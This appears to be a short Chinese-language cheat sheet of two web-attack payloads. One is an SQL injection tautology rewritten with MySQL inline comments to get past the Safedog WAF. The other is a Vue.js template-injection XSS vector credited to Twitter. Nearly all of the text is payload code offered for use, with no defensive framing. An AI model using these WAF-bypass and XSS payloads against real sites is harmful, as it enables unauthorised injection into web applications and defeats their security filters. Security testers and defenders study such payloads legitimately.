1、sql注入绕过安全狗waf：
```
and 1=1
```
变为
```
and /*!1=1*/
```

2、twitter上最新xss payload：
```
<script>alert("ybdt")</script>
```
变为
```
<x v-html=_c.constructor('alert(1)')()>
```
